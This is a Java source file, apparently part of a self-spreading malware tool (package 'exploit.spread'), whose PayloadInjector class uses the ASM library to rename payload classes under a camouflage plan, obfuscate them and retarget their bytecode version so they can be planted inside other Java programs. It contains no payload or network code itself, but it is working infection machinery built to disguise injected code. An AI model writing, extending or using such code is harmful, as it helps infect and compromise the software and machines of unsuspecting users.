package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;

import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;

public final class PayloadInjector {

    public record Result(String finalPayloadFQN, Map<String, byte[]> allPayloadBytecode) {}

    public static Result inject(Class<?> sourceBaseClass, CamouflageUtils.CamouflagePlan plan, int targetMajorVersion) throws Exception {
        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Starting payload injection.");
        List<Class<?>> classesToInject = PatchUtils.getClassesToInject(sourceBaseClass);

        Map<String, String> relocationMap = new HashMap<>();
        String finalPayloadFQN = null;
        String newPackageName = plan.packageName().replace('/', '.');

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Building relocation map for renaming...");
        for (Class<?> clazz : classesToInject) {
            String sourceFQN = clazz.getName();
            String newSimpleName = clazz.getSimpleName().replace(sourceBaseClass.getSimpleName(), plan.namePrefix());
            String destFQN = newPackageName + "." + newSimpleName;

            if (clazz.equals(sourceBaseClass)) {
                finalPayloadFQN = destFQN;
            }
            relocationMap.put(sourceFQN.replace('.', '/'), destFQN.replace('.', '/'));
            Exploit.sender.sendDebug(Level.INFO, String.format("  |-> MAP: '%s' ==> '%s'", sourceFQN, destFQN));
        }

        SimpleRemapper remapper = new SimpleRemapper(relocationMap);
        Map<String, byte[]> allPayloadBytecode = new HashMap<>();

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Loading and transforming payload classes...");
        for (Class<?> clazz : classesToInject) {
            String resourcePath = clazz.getName().replace('.', '/') + ".class";
            try (InputStream is = clazz.getClassLoader().getResourceAsStream(resourcePath)) {
                if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);

                ClassReader classReader = new ClassReader(is);
                ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
                
                ClassRemapper classRemapper = new ClassRemapper(classWriter, remapper);
                classReader.accept(classRemapper, ClassReader.EXPAND_FRAMES);

                byte[] renamedBytecode = classWriter.toByteArray();
                String newFQN = remapper.map(clazz.getName().replace('.', '/')).replace('/', '.');

                byte[] finalBytecode = PayloadObfuscator.transform(renamedBytecode, newFQN);

                PatchUtils.setMajorVersion(finalBytecode, targetMajorVersion);
                
                allPayloadBytecode.put(newFQN, finalBytecode);
                Exploit.sender.sendDebug(Level.INFO, "  |-> Transformed (in memory): " + newFQN);
            }
        }

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Payload injection phase complete.");
        return new Result(finalPayloadFQN, allPayloadBytecode);
    }
}